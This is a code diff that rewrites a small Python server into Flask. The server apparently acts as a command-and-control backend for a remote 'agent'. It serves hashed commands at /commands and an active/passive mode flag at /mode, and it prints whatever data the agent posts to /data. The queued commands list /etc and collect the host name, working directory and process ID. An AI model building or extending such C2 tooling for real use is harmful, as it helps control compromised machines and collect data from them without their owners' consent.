@@ -1,80 +1,53 @@
-import socketserver
-import http.server
 import hashlib
-import threading
+from flask import Flask, request
 # import ssl
 
 PORT = 9998
+active = True
 
-class TCPHandler(socketserver.BaseRequestHandler):
+cmds = []
 
-    def handle(self):
-        """Recieve incoming data from agent
-        """
-        self.data = self.request.recv(2048).strip()
-        print(str(self.data, "utf-8"))
+app = Flask(__name__)
 
+@app.get("/commands")
+def serve_commands():
+    """Serve activce commands
 
-
-def host_commands(cmds):
-    """host the http server serving the commands
-    Args:
-        cmds (list): list of commands to host on the server
+    Returns:
+        string: list of commands
     """
-
-
-    Handler = http.server.SimpleHTTPRequestHandler
-    server = http.server.ThreadingHTTPServer(("0.0.0.0", PORT + 1), Handler)
-    # TODO: SSL
-    # server.socket = ssl.wrap_socket(server.socket, certfile='', server_side= True)
-
-    write_commands(cmds)
-    server_thread = threading.Thread(target=server.serve_forever)
-    server_thread.daemon = True
-    print("serving at port", PORT + 1)
-    server_thread.start()
-
-
-def set_mode(active):
-    """Set the mode for the remote agent
-
-    Args:
-        active (bool): True if go active
-    """
-    f=open("mode.txt", "w")
-    if active:
-        f.write("active")
-    else:
-        f.write("passive")
-    f.close()
-    
-
-
-def write_commands(cmds):
-    """Write commands to http server
-
-    Args:
-        cmds (list): list of commands to write to http directory
-    """
-    f = open("commands.txt", "w")
+    page = ""
     for cmd in cmds:
         hash = hashlib.sha256(cmd.encode("utf-8")).hexdigest()
-        f.write(f"{cmd}:{hash}\n")
-    f.close()
+        page += f"{cmd}:{hash}\n"
+    return page
+
+@app.get("/mode")
+def serve_mode():
+    """show the mode
+
+    Returns:
+        string: active or passive for the mode
+    """
+    if active:
+        return "active"
+    return "passive"
+
+@app.post("/data")
+def recieve_data():
+    """Recieve post request containing data
+
+    Returns:
+        string: blank page, 200 code
+    """
+    print(str(request.data, "utf-8"))
+    return "", 200
 
 
 if __name__ == "__main__":
-    cmds = []
     cmds.append("password:ls:/etc")
     cmds.append("password:BUILTIN:name")
     cmds.append("password:BUILTIN:cwd")
     cmds.append("password:BUILTIN:pid")
 
-    set_mode(active=True)
-    host_commands(cmds)
-
-    with socketserver.TCPServer(("0.0.0.0", PORT), TCPHandler) as server:
-        # Activate the server; this will keep running until you
-        # interrupt the program with Ctrl-C
-        print(f"Receiving at port {PORT}")
-        server.serve_forever()
+    app.run(host="localhost", port=PORT, debug=True)
